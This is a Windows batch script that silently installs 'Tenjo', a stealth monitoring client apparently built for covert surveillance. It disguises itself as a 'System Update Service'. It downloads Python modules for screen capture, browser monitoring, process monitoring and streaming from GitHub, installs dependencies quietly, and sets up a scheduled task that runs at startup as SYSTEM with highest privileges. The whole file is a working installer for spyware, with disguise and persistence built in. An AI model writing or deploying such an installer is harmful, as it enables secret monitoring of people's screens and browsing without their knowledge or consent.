@echo off
setlocal enabledelayedexpansion

:: Tenjo Stealth Installer for Windows - Simplified Version
:: This script downloads and installs the monitoring client silently

:: Configuration
set APP_NAME=SystemUpdate
set INSTALL_DIR=%APPDATA%\SystemUpdate
set SERVICE_NAME=SystemUpdateService
set PYTHON_REQUIREMENTS=requests mss psutil pillow
set GITHUB_RAW=https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client

:: Silent mode check
set SILENT=%1
if "%SILENT%"=="" set SILENT=false

:: Admin check
net session >nul 2>&1
if %errorLevel% == 0 (
    set INSTALL_DIR=%PROGRAMDATA%\SystemUpdate
    set ADMIN_MODE=true
) else (
    set ADMIN_MODE=false
)

if not "%SILENT%"=="true" (
    echo [INFO] Installing System Update Service...
)

:: Stop existing processes and services
taskkill /F /IM "stealth_main.exe" >nul 2>&1
taskkill /F /IM "python.exe" /FI "WINDOWTITLE eq SystemUpdate*" >nul 2>&1
schtasks /End /TN "%SERVICE_NAME%" >nul 2>&1
schtasks /Delete /TN "%SERVICE_NAME%" /F >nul 2>&1

:: Create installation directories
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
if not exist "%INSTALL_DIR%\src" mkdir "%INSTALL_DIR%\src"
if not exist "%INSTALL_DIR%\src\core" mkdir "%INSTALL_DIR%\src\core"
if not exist "%INSTALL_DIR%\src\modules" mkdir "%INSTALL_DIR%\src\modules"
if not exist "%INSTALL_DIR%\src\utils" mkdir "%INSTALL_DIR%\src\utils"
if not exist "%INSTALL_DIR%\logs" mkdir "%INSTALL_DIR%\logs"

:: Download essential application files
if not "%SILENT%"=="true" echo [INFO] Downloading application files...

:: Use PowerShell to download files (more reliable than bitsadmin)
powershell -Command "try { Invoke-WebRequest -Uri '%GITHUB_RAW%/main.py' -OutFile '%INSTALL_DIR%\main.py' -UseBasicParsing } catch { exit 1 }"
if errorlevel 1 (
    if not "%SILENT%"=="true" echo [ERROR] Failed to download main.py
    exit /b 1
)

:: Download core modules
powershell -Command "try { Invoke-WebRequest -Uri '%GITHUB_RAW%/src/core/config.py' -OutFile '%INSTALL_DIR%\src\core\config.py' -UseBasicParsing } catch { }" >nul 2>&1
powershell -Command "try { Invoke-WebRequest -Uri '%GITHUB_RAW%/src/utils/api_client.py' -OutFile '%INSTALL_DIR%\src\utils\api_client.py' -UseBasicParsing } catch { }" >nul 2>&1
powershell -Command "try { Invoke-WebRequest -Uri '%GITHUB_RAW%/src/utils/stealth.py' -OutFile '%INSTALL_DIR%\src\utils\stealth.py' -UseBasicParsing } catch { }" >nul 2>&1
powershell -Command "try { Invoke-WebRequest -Uri '%GITHUB_RAW%/src/modules/screen_capture.py' -OutFile '%INSTALL_DIR%\src\modules\screen_capture.py' -UseBasicParsing } catch { }" >nul 2>&1
powershell -Command "try { Invoke-WebRequest -Uri '%GITHUB_RAW%/src/modules/browser_monitor.py' -OutFile '%INSTALL_DIR%\src\modules\browser_monitor.py' -UseBasicParsing } catch { }" >nul 2>&1
powershell -Command "try { Invoke-WebRequest -Uri '%GITHUB_RAW%/src/modules/process_monitor.py' -OutFile '%INSTALL_DIR%\src\modules\process_monitor.py' -UseBasicParsing } catch { }" >nul 2>&1
powershell -Command "try { Invoke-WebRequest -Uri '%GITHUB_RAW%/src/modules/stream_handler.py' -OutFile '%INSTALL_DIR%\src\modules\stream_handler.py' -UseBasicParsing } catch { }" >nul 2>&1

:: Create __init__.py files for Python modules
echo. > "%INSTALL_DIR%\src\__init__.py"
echo. > "%INSTALL_DIR%\src\core\__init__.py"
echo. > "%INSTALL_DIR%\src\modules\__init__.py"
echo. > "%INSTALL_DIR%\src\utils\__init__.py"

:: Install Python dependencies
if not "%SILENT%"=="true" echo [INFO] Installing Python dependencies...
python -m pip install --user --quiet %PYTHON_REQUIREMENTS% >nul 2>&1
if errorlevel 1 (
    python -m pip install --quiet %PYTHON_REQUIREMENTS% >nul 2>&1
)

:: Create stealth main script
if not "%SILENT%"=="true" echo [INFO] Configuring stealth service...

(
echo import sys
echo import os
echo import time
echo import signal
echo import logging
echo from pathlib import Path
echo.
echo # Set up minimal logging
echo log_dir = Path^(__file__^).parent / "logs"
echo log_dir.mkdir^(exist_ok=True^)
echo.
echo logging.basicConfig^(
echo     level=logging.WARNING,
echo     format='%%^(asctime^)s - %%^(levelname^)s - %%^(message^)s',
echo     handlers=[logging.FileHandler^(log_dir / "stealth.log"^)]
echo ^)
echo.
echo def signal_handler^(signum, frame^):
echo     logging.info^("Received signal %%d, shutting down...", signum^)
echo     sys.exit^(0^)
echo.
echo def main^(^):
echo     try:
echo         signal.signal^(signal.SIGTERM, signal_handler^)
echo         signal.signal^(signal.SIGINT, signal_handler^)
echo     except:
echo         pass  # Windows may not support all signals
echo     
echo     app_dir = Path^(__file__^).parent
echo     os.chdir^(app_dir^)
echo     
echo     logging.warning^("Stealth monitoring service started"^)
echo     
echo     try:
echo         sys.path.insert^(0, str^(app_dir^)^)
echo         import main
echo         main.main^(stealth_mode=True^)
echo     except Exception as e:
echo         logging.error^("Application error: %%s", e^)
echo         time.sleep^(60^)
echo         sys.exit^(1^)
echo.
echo if __name__ == "__main__":
echo     main^(^)
) > "%INSTALL_DIR%\stealth_main.py"

:: Create Windows service using Task Scheduler
if not "%SILENT%"=="true" echo [INFO] Setting up auto-start service...

:: Create task that runs at startup (system level if admin, user level otherwise)
if "%ADMIN_MODE%"=="true" (
    schtasks /Create /TN "%SERVICE_NAME%" /TR "python \"%INSTALL_DIR%\stealth_main.py\"" /SC ONSTART /RU "SYSTEM" /RL HIGHEST /F >nul 2>&1
) else (
    schtasks /Create /TN "%SERVICE_NAME%" /TR "python \"%INSTALL_DIR%\stealth_main.py\"" /SC ONLOGON /F >nul 2>&1
)

:: Start the service immediately
if not "%SILENT%"=="true" echo [INFO] Starting service...
schtasks /Run /TN "%SERVICE_NAME%" >nul 2>&1

:: Create uninstall script
(
echo @echo off
echo set SERVICE_NAME=SystemUpdateService
echo set INSTALL_DIR=%%APPDATA%%\SystemUpdate
echo.
echo :: Admin check
echo net session ^>nul 2^>^&1
echo if %%errorLevel%% == 0 ^(
echo     set INSTALL_DIR=%%PROGRAMDATA%%\SystemUpdate
echo ^)
echo.
echo :: Stop processes and service
echo taskkill /F /IM "stealth_main.exe" ^>nul 2^>^&1
echo taskkill /F /IM "python.exe" /FI "WINDOWTITLE eq SystemUpdate*" ^>nul 2^>^&1
echo schtasks /End /TN "%%SERVICE_NAME%%" ^>nul 2^>^&1
echo schtasks /Delete /TN "%%SERVICE_NAME%%" /F ^>nul 2^>^&1
echo.
echo :: Remove installation
echo if exist "%%INSTALL_DIR%%" rmdir /S /Q "%%INSTALL_DIR%%" ^>nul 2^>^&1
echo.
echo echo System Update Service uninstalled successfully
) > "%INSTALL_DIR%\uninstall.bat"

if not "%SILENT%"=="true" (
    echo [SUCCESS] System Update Service installed successfully
    echo [INFO] Installed at: %INSTALL_DIR%
    echo [INFO] Service will auto-start on boot
    echo.
    echo The service is now running silently in the background.
    echo To uninstall, run: "%INSTALL_DIR%\uninstall.bat"
)

endlocal
